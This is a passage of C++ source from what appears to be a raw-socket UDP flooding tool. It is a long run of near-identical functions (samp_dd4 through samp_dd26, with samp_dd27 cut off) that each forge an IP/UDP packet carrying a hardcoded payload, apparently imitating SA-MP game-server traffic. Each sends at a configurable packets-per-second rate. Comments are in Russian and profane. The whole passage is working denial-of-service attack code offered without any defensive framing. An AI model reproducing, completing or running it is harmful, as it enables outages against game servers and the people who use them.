	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd4(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 9; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x05\x00\xb2\x28\x06\x4a\xe4\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd5(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 12; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x05\x80\xb8\x43\x00\x11\x40\xd0\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd6(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 247; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x04\x80\xc8\xb9\x40\x07\x40\x70\x14\x3d\xca\x20\xe0\x60\x00\x41\x99\x1c\x7e\x1d\xdc\x5d\xdc\xa4\x1d\x9c\xbd\xbf\xc0\xf8\x5f\x7c\x3e\x1c\x1e\x5f\x80\xb8\x5f\x7e\xbd\xdc\x85\x00\x69\xd1\x39\xd3\x75\x7b\x49\xd0\x95\x7b\x49\xd0\x2e\x6c\xe8\x8c\xe8\x62\xbd\xaa\xbd\xba\xbd\xa2\xbd\x9f\x36\x74\x4e\x74\x32\x74\x2a\x74\x31\x5e\xd9\x5e\xdd\x5e\xc5\x5e\xcd\x5e\xeb\x9a\xfb\x42\xaf\x69\x3a\x12\xaf\x6b\x3a\x02\xaf\x7f\x3a\x13\x3a\x13\xcd\x9d\x16\x57\xb7\x57\xb5\x57\xb7\x57\xb8\x9d\x35\xe6\xbe\xd0\xce\x81\xab\xd9\xab\xdb\xab\xda\xab\xdb\xce\x80\x4e\x84\xce\x85\x4e\x84\xf3\x67\x44\x95\xed\x95\xec\x67\x40\x67\x40\xe7\x42\xa7\x43\x15\xed\x27\x42\x67\x43\x3a\xbd\xb4\xe8\x62\xbd\x8a\xbd\x82\xbd\xba\xbd\xa4\xe8\x0c\xe8\x7c\xe8\x62\xbd\xaf\x35\xf2\x91\x58\xac\xa8\xaa\x2a\x8a\xa2\x7c\xa7\x9d\x17\x57\xb3\x57\xb0\x57\xbe\x7d\xb9\x57\xb3\x35\xf2\x91\x58\xac\x56\x2b\x2a\x2a\x89\xf2\x9e\x74\x49\x5e\xd9\x5e\xc6\x74\x06\x74\x0e\x74\x2a\x74\x31\x5e\xd2\x74\x26\x74\x33\xbe\xd0\xce\x81\xab\xd9\xab\xdb\xa0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd7(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 169; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x06\x00\xc8\xb9\x80\x00\x40\x50\x14\x3d\xdc\x20\x81\x20\x00\x41\x7a\x3d\xfc\x1c\x5d\xa4\x1d\x9c\x1f\x1d\x1d\xa0\x59\xd9\x40\xb9\xbc\x1c\xfc\x1c\x81\x00\x45\x5a\x42\x6a\xcd\xab\x17\x2b\x62\x37\x51\x1c\x32\x4b\xd9\xb5\x06\x2d\xe0\x03\x6a\x0b\x38\xe6\x94\x1a\xf8\x59\x5c\x85\x66\xce\xdc\x01\x6d\x83\x6a\x4b\xca\x6f\x48\x36\xac\x93\x69\x3d\x88\xda\x84\x99\xc0\xda\x82\xe5\x21\x66\xd5\xb8\xdd\x8c\x9a\xf8\x8b\xca\x14\xc6\xd4\x18\x9c\x97\x06\xab\x88\x4e\xdc\x64\xda\xb2\xf2\x2e\x8c\x1b\x56\x31\xf9\x06\xce\xd8\x52\x76\xb6\x4c\xd3\x1b\x56\xcb\x66\xcd\xab\x16\xa0\xca\xb5\x52\x34\xc4\x64\x56\x95\xf5\x5d\x2a\x2a\x88\xda\xb1\x8a\x8c\x05\x51\xb5\x07\xdd\x5e\x8d\x7d\xee\xa0\x8f\xc2\xb0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd8(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 71; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x08\x80\xc8\xba\x80\x0f\x40\x10\x14\x71\xda\x20\x20\x00\x00\x20\x00\x00\x1d\x54\x80\x00\x00\x20\x00\x00\x02\x95\xc8\xf3\xd0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x04\x20\x00\x09\xa4\x20\x00\x00\x00\x00\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x00\x00\x00\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd9(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 29; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x09\x00\xc8\xba\xc0\x15\x60\x14\x60\xe9\x0f\xff\xf0\x20\x00\x00\x00\x10\x00\x00\x0f\x20\x30\x00\x00\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd10(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 17; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x36\x00\xc8\x91\x00\x52\x68\x14\x71\xe3\x10\x00\x00\x10\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd11(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 149; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x38\x80\xc2\xec\x14\x5d\xed\x0f\xf0\x0d\xd2\x11\x20\x00\x00\x04\x96\xe6\x66\x57\x26\xe7\x57\x32\x0e\x7e\x0f\x1e\xfe\x0e\x2e\xde\x5e\xd0\x72\x01\x91\x23\x80\xa2\xc0\x14\xa5\xe1\x00\x10\x00\x73\x01\x91\x24\x00\x83\x60\x40\x14\xa4\xdf\x00\x20\x20\x13\x60\x20\x00\x10\x9b\x40\x78\xb1\xf5\x0b\xb8\x8d\x52\xa0\xa8\x86\x87\x68\xc8\x7f\xff\xe0\x00\x0f\x48\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\xff\xff\xff\xff\xff\xff\xff\xe0\x74\x01\x70\x87\x80\x22\x80\xd0\x00\x00\x00\x00\x75\x01\x91\x24\x80\xa3\x40\x14\x46\xe1\x80\x10\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd12(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 11; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0d\x80\x48\x83\x00\x11\x00\x14\x9c\xf8\x08", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd13(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 3; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\xe3\x1e\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd14(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 11; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0e\x00\x48\x83\x40\x11\x00\x14\x9c\xf8\x0e", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd15(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 12; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x11\x00\x38\x40\x80\x11\x40\xd0\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd16(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 9; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x1a\x00\x32\x28\x06\x70\xcd\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd17(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 115; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0f\x00\x48\x84\x00\x11\x00\x14\x98\xf8\x18\x1f\x00\x91\x08\x80\x23\xc0\x14\x92\xe2\x0f\x7a\x28\x23\xd0\x20\x00\x91\x09\x00\x22\x00\x14\x5e\xf8\x15\x21\x00\x91\x09\x80\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\x22\x00\x91\x0a\x00\x22\xc0\x14\x1d\xe1\x00\xc0\x00\x23\x00\x91\x0a\x80\x2b\xc0\x14\x2b\xea\x04\xa3\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x24\x00\x91\x0b\x00\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x08\x40\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd18(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 115; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x19\x80\x48\x89\x40\x11\x00\x14\x98\xf8\x04\x34\x00\x91\x13\x00\x23\xc0\x14\x92\xe2\x00\xb3\x2f\x63\xb0\x35\x00\x91\x13\x80\x22\x00\x14\x5e\xf8\x09\x36\x00\x91\x14\x00\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\x37\x00\x91\x14\x80\x22\xc0\x14\x1d\xe1\x00\xa0\x00\x38\x00\x91\x15\x00\x2b\xc0\x14\x2b\xea\x0f\xd2\xf0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x39\x00\x91\x15\x80\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x06\xf0\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd19(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 130; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x55\x00\x48\xa7\x00\x11\xe0\x14\x3c\xe2\x09\xa7\x50\x00\x00\xab\x00\x91\x4e\x80\x22\x00\x14\x98\xf8\x0a\xac\x00\x91\x4f\x00\x23\xc0\x14\x92\xe2\x0f\xce\x28\x73\xc0\xad\x00\x91\x4f\x80\x22\x00\x14\x5e\xf8\x00\xae\x00\x91\x50\x00\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xaf\x00\x91\x50\x80\x22\xc0\x14\x1d\xe1\x00\xf0\x00\xb0\x00\x91\x51\x00\x2b\xc0\x14\x2b\xea\x0c\xd3\xe0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\xb1\x00\x91\x51\x80\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x08\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd20(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 12; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x00\x83\xb8\x42\x00\x11\x40\xd0\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd21(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 115; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x01\x03\xc8\xb9\xc1\x91\x00\x14\x98\xf8\x28\x03\x07\x91\x74\x03\x23\xc0\x14\x92\xe2\x0e\x0d\xcf\x73\xb0\x04\x07\x91\x74\x83\x22\x00\x14\x5e\xf8\x08\x05\x07\x91\x75\x03\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\x06\x07\x91\x75\x83\x22\xc0\x14\x1d\xe1\x00\xe0\x00\x07\x07\x91\x76\x03\x2b\xc0\x14\x2b\xea\x0d\x23\x50\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x08\x07\x91\x76\x83\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x01\x50\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd22(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 31; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x3f\x80\x48\x9b\xc0\x15\xe0\x14\x2b\xea\x04\x80\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd23(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 31; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x40\x00\x48\x9c\x00\x15\xe0\x14\x2b\xea\x03\x10\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd24(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 31; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x41\x00\x48\x9c\x80\x15\xe0\x14\x2b\xea\x0a\xb1\xb0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd25(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 186; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x09\x80\x48\x82\x40\x15\xe0\x14\x2b\xea\x08\xc0\xf0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x14\x00\x91\x05\x00\x2b\xc0\x14\x2b\xea\x04\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x15\x00\x91\x05\x80\x2b\xc0\x14\x2b\xea\x0a\x91\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x16\x00\x91\x06\x00\x2b\xc0\x14\x2b\xea\x0d\x51\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x17\x00\x91\x06\x80\x2b\xc0\x14\x2b\xea\x0e\xf1\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x18\x00\x91\x07\x00\x2b\xc0\x14\x2b\xea\x0b\x51\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd26(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 186; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0c\x80\x48\x83\xc0\x15\xe0\x14\x2b\xea\x08\xc0\xf0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x1a\x00\x91\x08\x00\x2b\xc0\x14\x2b\xea\x04\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x1b\x00\x91\x08\x80\x2b\xc0\x14\x2b\xea\x0a\x91\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x1c\x00\x91\x09\x00\x2b\xc0\x14\x2b\xea\x0d\x51\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x1d\x00\x91\x09\x80\x2b\xc0\x14\x2b\xea\x0e\xf1\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x1e\x00\x91\x0a\x00\x2b\xc0\x14\x2b\xea\x0b\x51\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd27(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 186; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
